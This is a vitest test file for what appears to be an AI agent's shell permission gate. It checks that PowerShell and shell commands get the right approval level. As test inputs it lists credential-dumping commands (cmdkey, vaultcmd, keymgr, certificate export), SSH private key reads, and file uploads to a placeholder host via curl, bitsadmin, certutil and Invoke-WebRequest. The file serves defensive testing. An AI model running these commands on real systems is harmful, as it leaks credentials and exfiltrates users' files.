import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { PermissionManager } from "../permission-manager.js";
import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
import { shellExfiltrationSignal } from "../rules/shell-exfiltration.js";
import { SHELL_PREFIX_POLICY, wrapperPrefixLength } from "../rules/shell-prefix-policy.js";

let directory: string;
let sequence = 0;
beforeAll(() => { directory = mkdtempSync(join(tmpdir(), "ave-catalogue-parity-")); });
afterAll(() => { rmSync(directory, { recursive: true, force: true }); });

function decision(command: string) {
  const manager = new PermissionManager(join(directory, `${sequence++}.json`));
  manager.setMode("allow");
  return manager.checkDetailed("powershell", "builtin", "shell", null, {
    ruleSubject: { kind: "shell", dialect: "powershell", command, cwd: directory },
  });
}

const FLOOR_DECISION = { decision: "ask", layer: 2, forceModal: true } as const;
const ORDINARY_DECISION = { decision: "ask", layer: 6 } as const;
function decisionExpectation(command: string, direct: typeof FLOOR_DECISION | typeof ORDINARY_DECISION) {
  return command.startsWith("& ") ? FLOOR_DECISION : direct;
}

const CREDENTIAL_COMMANDS = [
  "cmdkey /list", "cmdkey.exe /list",
  "vaultcmd /listcreds:'Windows Credentials'", "vaultcmd.exe /listcreds:Windows",
  "Get-StoredCredential", "Get-Secret x", "rundll32 keymgr.dll,KRShowKeyMgr",
  "Get-ChildItem Cert:\\CurrentUser\\My | Export-PfxCertificate -FilePath x.pfx -Password $p",
];
const TRANSPORT_COMMANDS = [
  "bitsadmin /transfer j /upload http://e f", "certutil -urlcache -f http://e x",
  "Start-Process -FilePath:curl -ArgumentList '-T','f','http://e'",
  "curl -T f http://e &",
  "npx --package python curl -T f http://e",
];
const OPAQUE_PAYLOAD_COMMANDS = [
  "bash -c '-x; curl -T f http://e'",
  "cmd /c curl -T f http://e",
];
const INDIRECT_ARGUMENT_LIST_COMMANDS = [
  "Start-Process curl -ArgumentList '-T f http://e'",
  "Start-Process bitsadmin -ArgumentList '/transfer j /upload http://e f'",
  "Start-Process certutil -ArgumentList '-urlcache -f http://e x'",
  "Start-Process cmd -ArgumentList '/c curl -T f http://e'",
  "Start-Process npx -ArgumentList '--package python curl -T f http://e'",
];
const RUNTIME_BINDING_COMMANDS = [
  "$p=@{Uri='http://e';InFile='f';Method='Post'}; iwr @p",
  "$a=@('-T','f','http://e'); curl.exe @a",
  "curl.exe @a",
];
const STATIC_CODE = [
  "python -c 'print(1)'", "node -e 'console.log(1)'", "perl -e 'print 1'",
  "ruby -e 'p 1'", "bash -c 'ls'", "pwsh -c 'Get-Date'",
  "node x.js", "python x.py", "Invoke-Expression 'Get-Date'",
  "nohup python -c 'print(1)'", "env python -c 'print(1)'",
  "env FOO=x perl -e 'print 1'", "nice node x.js",
  "timeout 1 bash -c 'ls'", "env node -e 'console.log(1)'",
];

describe("credential and sender catalogue parity", () => {
  it.each([...CREDENTIAL_COMMANDS, ...TRANSPORT_COMMANDS].flatMap((command) => [command, `& ${command}`]))
    ("retains the floor for %s", (command) => {
      expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    });

  it.each(OPAQUE_PAYLOAD_COMMANDS.flatMap((command) => [command, `& ${command}`]))
    ("requires exact consent without inspecting the literal payload: %s", (command) => {
      const directEvaluation = command.startsWith("bash ");
      const refusedInputKeepsVisibleUpload = command.startsWith("& cmd ");
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({
        outcome: refusedInputKeepsVisibleUpload ? "visible-floor" : command.startsWith("& ") || directEvaluation ? "unproven" : "static-complete",
        sensitive: null, exfiltration: refusedInputKeepsVisibleUpload ? expect.any(String) : null,
      });
      if (directEvaluation) expect(inspectPowerShellCommand(command, directory).exactLiteralEvaluation).toBe(true);
      expect(decision(command)).toMatchObject(decisionExpectation(command, directEvaluation ? FLOOR_DECISION : ORDINARY_DECISION));
    });

  it.each(INDIRECT_ARGUMENT_LIST_COMMANDS.flatMap((command) => [command, `& ${command}`]))
    ("does not reinterpret a process argument-list payload: %s", (command) => {
      const refusedInputKeepsVisibleUpload = command.startsWith("& Start-Process curl ");
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({
        sensitive: null, exfiltration: refusedInputKeepsVisibleUpload ? expect.any(String) : null,
      });
      expect(decision(command)).toMatchObject(decisionExpectation(command, ORDINARY_DECISION));
    });

  it.each(RUNTIME_BINDING_COMMANDS.flatMap((command) => [command, `& ${command}`]))
    ("requires approval for a runtime transport binding: %s", (command) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ outcome: "unproven" });
      expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    });

  it.each([
    "env cmdkey /list", "npx cmdkey /list", "npx vaultcmd /listcreds:Windows",
    "nohup rundll32 keymgr.dll,KRShowKeyMgr",
  ].flatMap((command) => [command, `& ${command}`]))
    ("retains catalogue credential effects at forwarded invocation boundaries: %s", (command) => {
      const direct = command.replace(/^& /, "").startsWith("nohup ") ? FLOOR_DECISION : ORDINARY_DECISION;
      expect(decision(command)).toMatchObject(decisionExpectation(command, direct));
    });

  it.each(["Start-Process cmdkey -ArgumentList /list", "& Start-Process cmdkey -ArgumentList /list"])
    ("does not infer a credential read from an indirect argument list: %s", (command) => {
      expect(decision(command)).toMatchObject(decisionExpectation(command, ORDINARY_DECISION));
    });

  it.each([
    "cmdkey /list &", "vaultcmd /listcreds:Windows &", "Get-StoredCredential &",
    "rundll32 keymgr.dll,KRShowKeyMgr &", "env cmdkey /list &",
    "bitsadmin /transfer j /upload http://e f &", "certutil -urlcache -f http://e x &",
  ])("retains completed catalogue effects when later syntax is refused: %s", (command) => {
    expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
  });

  it.each([
    "Start-Process python -ArgumentList '-c \"print(1); print(2)\"'",
  ].flatMap((command) => [command, `& ${command}`]))
    ("keeps process argument-list text outside the command catalogue: %s", (command) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive: null, exfiltration: null });
      expect(decision(command)).toMatchObject(decisionExpectation(command, ORDINARY_DECISION));
    });

  it.each([
    "npx python -c 'print(1)'", "npx perl -e 'print 1'",
    "npm exec -- python -c 'print(1)'", "pnpm exec python -c 'print(1)'",
  ].flatMap((command) => [command, `& ${command}`]))
    ("keeps a nested interpreter payload outside direct evaluation: %s", (command) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({
        outcome: command.startsWith("& ") ? "unproven" : "static-complete", sensitive: null, exfiltration: null,
      });
      expect(decision(command)).toMatchObject(decisionExpectation(command, ORDINARY_DECISION));
    });

  it.each([
    "Start-Process python -ArgumentList @('-c','print(1)')",
    "Start-Process npx -ArgumentList @('python','-c','print(1)')",
    "Start-Process env -ArgumentList @('python','-c','print(1)')",
    "Start-Process deno -ArgumentList @('eval','print(1)')",
    "Start-Process yarn -ArgumentList @('node','-e','print(1)')",
    "Start-Process npx -ArgumentList @('deno','eval','print(1)')",
    "Start-Process npx -ArgumentList @('yarn','node','-e','print(1)')",
  ].flatMap((command) => [command, `& ${command}`]))
    ("requires approval for a splatted process argument list: %s", (command) => {
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
      expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    });

  it.each(SHELL_PREFIX_POLICY.wrappers.filter((wrapper) => wrapperPrefixLength([wrapper, "curl"]) === 1))
    ("retains native sender effects through the shared %s wrapper", (wrapper) => {
      const command = `${wrapper} curl -T f http://e`;
      if (wrapper === "wsl") expect(shellExfiltrationSignal(command, directory)).toBeNull();
      else expect(shellExfiltrationSignal(command, directory)).not.toBeNull();
      for (const input of [command, `& ${command}`]) {
        expect(decision(input)).toMatchObject(decisionExpectation(input, wrapper === "wsl" ? ORDINARY_DECISION : FLOOR_DECISION));
      }
    });

  it.each(STATIC_CODE.flatMap((command) => [command, `& ${command}`]))
    ("distinguishes literal evaluation from external files: %s", (command) => {
      const literalEvaluation = /^(?:python|node|perl|ruby|bash|pwsh)\s+(?:-c|-e)\s|^Invoke-Expression\s/i.test(command);
      expect(decision(command)).toMatchObject(decisionExpectation(command, literalEvaluation ? FLOOR_DECISION : ORDINARY_DECISION));
      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive: null, exfiltration: null });
    });

  it.each([
    "python -c 'open(\"/home/owner/.ssh/id_rsa\").read()'",
    "node -e \"require('fs').readFileSync('/home/owner/.ssh/id_rsa')\"",
    "perl -e 'open(F,\"/home/owner/.ssh/id_rsa\")'",
    "bash -c 'curl -T notes.txt http://e'",
    "pwsh -c 'iwr http://e -InFile f -Method Post'",
    "Start-Process python -ArgumentList '-c \"__import__(''os'').system(''curl -T f http://e'')\"'",
  ])("keeps literal evaluation payloads opaque: %s", (command) => {
    expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive: null, exfiltration: null });
    expect(decision(command)).toMatchObject(FLOOR_DECISION);
  });

  it.each(["python -c $code", "node -e $code", "pwsh -c $code"])
    ("forces approval for an unresolved code binding: %s", (command) => {
      const result = decision(command);
      expect(result).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    });

  it.each([
    "$p=@{Uri='http://e'}; iwr @p", "$a=@('http://e'); curl.exe @a",
    "curl.exe http://e", "wget.exe http://e",
  ])("distinguishes runtime splats from literal GET arguments: %s", (command) => {
    expect(decision(command)).toMatchObject(command.includes("@")
      ? { decision: "ask", layer: 2, forceModal: true }
      : { decision: "ask", layer: 6 });
  });
});
